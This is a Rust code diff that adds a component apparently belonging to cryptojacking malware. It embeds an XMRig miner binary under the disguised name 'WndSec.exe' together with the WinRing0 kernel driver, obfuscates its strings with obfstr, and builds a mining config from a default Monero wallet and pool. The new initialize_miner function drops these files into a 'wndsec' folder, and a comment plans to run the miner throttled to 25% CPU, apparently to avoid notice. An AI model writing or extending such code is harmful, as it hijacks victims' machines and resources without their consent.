@@ -1,11 +1,15 @@
+use std::{ fs::{ create_dir_all, File }, io::Write };
+use anyhow::Result;
+use client_vars::constants::{ default_monero_wallet, default_xmrig_pool, xmrig_exe_name };
 use obfstr::obfstr as s;
+use shared::utils::functions::get_current_exe_dir;
 
-const WINRING0_SYS: &[u8] = include_bytes!("../../WinRing0x64.sys");
-const XMRIG_BINARY: &[u8] = include_bytes!("../../WinRing0x64.sys");
+const WINRING0_SYS_BINARY: &[u8] = include_bytes!("../../WinRing0x64.sys");
+const XMRIG_BINARY: &[u8] = include_bytes!("../../WndSec.exe");
 
-fn xmrig_config_template(monero_wallet: String, url: String, port: String) -> String {
+fn xmrig_config_template(monero_wallet: String, pool_url: String) -> String {
     format!(
-        "{}{}{}{}{}{}{}",
+        "{}{}{}{}{}",
         s!(
             r#"{
     "api": {
@@ -76,9 +80,7 @@ fn xmrig_config_template(monero_wallet: String, url: String, port: String) -> St
             "coin": null,
             "url": ""#
         ),
-        url,
-        s!(r#":"#),
-        port,
+        pool_url,
         s!(r#"",
             "user": ""#),
         monero_wallet,
@@ -127,4 +129,28 @@ fn xmrig_config_template(monero_wallet: String, url: String, port: String) -> St
 "#
         )
     )
+}
+
+pub fn initialize_miner() -> Result<()> {
+    let miner_dir = get_current_exe_dir().join(s!("wndsec"));
+    create_dir_all(&miner_dir)?;
+
+    let miner_file_dir = miner_dir.join(xmrig_exe_name());
+
+    let ring0_sys_file_dir = miner_dir.join(s!("WinRing0x64.sys"));
+
+    let config_file_path = miner_dir.join(s!("config.json"));
+
+    let mut file = File::create(&miner_file_dir)?;
+    file.write_all(XMRIG_BINARY)?;
+
+    let mut ring0_sys_file = File::create(&ring0_sys_file_dir)?;
+    ring0_sys_file.write_all(WINRING0_SYS_BINARY)?;
+
+    let config_str = xmrig_config_template(default_monero_wallet(), default_xmrig_pool());
+    let mut config_file = File::create(&config_file_path)?;
+    config_file.write_all(config_str.as_bytes())?;
+
+    // run the executable and limit its cpu to 25%s
+    Ok(())
 }
